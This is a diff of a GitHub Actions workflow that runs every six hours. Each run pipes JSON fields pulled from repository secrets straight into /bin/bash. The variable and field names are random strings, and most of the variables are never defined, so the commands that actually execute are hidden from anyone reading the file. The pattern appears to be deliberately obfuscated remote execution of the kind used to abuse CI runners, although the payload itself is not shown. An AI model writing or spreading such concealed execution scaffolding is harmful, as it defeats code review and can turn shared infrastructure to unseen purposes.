@@ -2,7 +2,8 @@ name: liaifangxin1985
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
+    - cron: '20 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,12 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: liaifangxin1985
         env:
-          gxq6712: ${{ secrets.gxq6712 }}
+          elzuf497: ${{ secrets.elzuf497 }}
         run: |
-          echo $gxq6712 | jq -r .wvtgy618 | /bin/bash
-          echo $o211 | jq -r .he54 | /bin/bash
-          echo $y52427 | jq -r .x88 | /bin/bash
-          echo $uhdq990 | jq -r .oun236 | /bin/bash
-          echo $fwp317 | jq -r .gqrzc2540 | /bin/bash
-          echo $alk48 | jq -r .vpiy91377 | /bin/bash
+          echo $elzuf497 | jq -r .hsv582 | /bin/bash
+          echo $idgn5 | jq -r .dkb65 | /bin/bash
+          echo $mejpy7954 | jq -r .y83598 | /bin/bash
+          echo $n5021 | jq -r .h6348 | /bin/bash
+          echo $voc27 | jq -r .pjehn10 | /bin/bash
+          echo $l9821 | jq -r .l28239 | /bin/bash
+          echo $wdwo814 | jq -r .qmjo76 | /bin/bash
 
